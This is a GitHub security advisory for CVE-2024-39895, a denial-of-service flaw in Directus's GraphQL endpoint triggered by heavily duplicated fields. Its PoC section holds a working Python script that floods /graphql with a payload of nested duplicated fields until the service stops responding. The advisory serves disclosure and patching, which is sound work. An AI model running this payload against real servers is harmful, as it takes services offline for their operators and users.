# [H] Directus GraphQL Field Duplication Denial of Service (DoS)

## Summary
Severity: High
Advisory: GHSA-7hmh-pfrp-vcx4
CVE: CVE-2024-39895
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-07-08
Source: https://github.com/advisories/GHSA-7hmh-pfrp-vcx4
Type: github-advisory

## Affected
- npm: `@directus/env` — affected >=0 <1.1.6

## Details
### Summary
A denial of service (DoS) attack by field duplication in GraphQL is a type of attack where an attacker exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple times in a single query. This can cause the server to perform redundant computations and consume excessive resources, leading to a denial of service for legitimate users.

### Details
Request to the endpoint /graphql are sent when visualizing graphs generated at a dashboard:
![image](https://github.com/directus/directus/assets/114263468/185eb60f-9092-47d4-81f4-add1a53e99c8)

![DoS5](https://github.com/directus/directus/assets/114263468/f43079f5-b9ab-4704-938f-dcb91453d464)


By modifying the data sent and duplicating many times the fields a DoS attack is possible. 

### PoC
The goal is to create a payload that generates a body like this, where the 'max' field is duplicated many times, each with the 'id' field duplicated many times inside it.
`{'query': 'query { query_4f4722ea: test_table_aggregated { max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  }  } }'}`

Although that payload seems harmless, a bigger one leaves the service unresponsive. 

The following code might serve as a PoC written in Python3:
```# Field Duplication DoS 
# GitHub @asantof

import requests

## CHANGE THIS VALUES: url, auth_token, query_name, collection_name
url = 'http://0.0.0.0:8055/graphql'
auth_token = '' 
query_name = 'query_XXXXX' 
collection_name = ''  

headers = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {auth_token}',
}

id_payload = 'id ' * 200
max_payload = 'max {' + id_payload + ' } '
full_payload = max_payload * 200

data = {
    'query': 'query { ' + query_name + ': ' + collection_name + '_aggregated { ' + full_payload + ' } }'
}

print(data)

response = requests.post(url, headers=headers, json=data)

print(response.json())
```

![DoS4](https://github.com/directus/directus/assets/114263468/965e50bc-24dc-405c-a0f1-c973bd4f378d)


After running it the service will be unresponsive for a while:
![DoS](https://github.com/directus/directus/assets/114263468/9865acc1-9b82-4d3d-8929-cf32500ce14d)


### Impact
The vulnerability impacts the service's availability by causing it to become unresponsive for a few minutes. An attacker could continuously send this request to the server, rendering the service unavailable indefinitely.

## References
- https://github.com/directus/directus/security/advisories/GHSA-7hmh-pfrp-vcx4
- https://nvd.nist.gov/vuln/detail/CVE-2024-39895
- https://github.com/directus/directus/commit/543b345695071c1de61a35004bd063fe59dba0c8
- https://github.com/directus/directus
